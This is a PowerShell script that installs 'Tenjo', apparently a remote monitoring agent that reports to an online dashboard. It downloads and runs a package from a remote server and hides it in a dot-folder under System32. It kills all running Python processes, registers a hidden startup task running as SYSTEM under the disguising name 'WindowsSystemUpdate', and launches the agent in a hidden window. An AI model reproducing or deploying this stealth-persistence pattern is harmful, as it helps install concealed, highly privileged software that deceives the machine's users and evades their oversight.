# SIMPLE VERSION - PowerShell Script for Windows Deployment
# Copy this entire block and paste in PowerShell (Run as Administrator)

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "Run as Administrator!" -ForegroundColor Red
    Read-Host
    exit
}

Write-Host "Installing Python and Deploying Tenjo..." -ForegroundColor Green

# Check Python
try {
    $pythonVersion = python --version 2>&1
    if (-not ($pythonVersion -match "Python 3\.(10|11|12)")) {
        throw "Need Python"
    }
    Write-Host "Python already installed: $pythonVersion" -ForegroundColor Green
} catch {
    Write-Host "Installing Python 3.10..." -ForegroundColor Yellow
    $pythonInstaller = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe" -OutFile $pythonInstaller -UseBasicParsing
    Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_pip=1" -Wait
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
    Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
    Write-Host "Python installed successfully" -ForegroundColor Green
}

# Stop existing processes
Get-Process -Name python -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# Clean old installation
if (Test-Path "C:\Windows\System32\.tenjo") {
    Remove-Item "C:\Windows\System32\.tenjo" -Recurse -Force -ErrorAction SilentlyContinue
}

# Create directories
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo" -Force | Out-Null
New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src" -Force | Out-Null

# Download installer
try {
    Write-Host "Downloading Tenjo installer..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri "https://tenjo.adilabs.id/downloads/installer_package.tar.gz" -OutFile "$env:TEMP\tenjo.tar.gz" -UseBasicParsing
    Write-Host "Downloaded successfully (29MB)" -ForegroundColor Green
} catch {
    Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host
    exit
}

# Extract installer
if (Get-Command tar -ErrorAction SilentlyContinue) {
    Write-Host "Extracting installer..." -ForegroundColor Cyan
    tar -xzf "$env:TEMP\tenjo.tar.gz" -C "C:\Windows\System32\.tenjo\"
    Write-Host "Extraction completed" -ForegroundColor Green
} else {
    Write-Host "Tar command not found - manual extraction needed" -ForegroundColor Red
    exit
}

# Install dependencies
Set-Location "C:\Windows\System32\.tenjo"
Write-Host "Installing Python dependencies..." -ForegroundColor Cyan
python -m pip install --upgrade pip --quiet
python -m pip install -r requirements.txt --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org

# Create scheduled task
Write-Host "Creating startup task..." -ForegroundColor Cyan
$action = New-ScheduledTaskAction -Execute "python" -Argument "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero)
$principal = New-ScheduledTaskPrincipal -UserID "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsSystemUpdate" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null

# Start service
Write-Host "Starting Tenjo service..." -ForegroundColor Cyan
Start-Process python "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo" -WindowStyle Hidden

# Cleanup
Remove-Item "$env:TEMP\tenjo.tar.gz" -Force -ErrorAction SilentlyContinue

Write-Host "Deployment completed successfully!" -ForegroundColor Green
Write-Host "Check dashboard: https://tenjo.adilabs.id" -ForegroundColor Cyan
Write-Host "This PC will appear online within 1-2 minutes" -ForegroundColor Yellow

Read-Host "Press Enter to exit"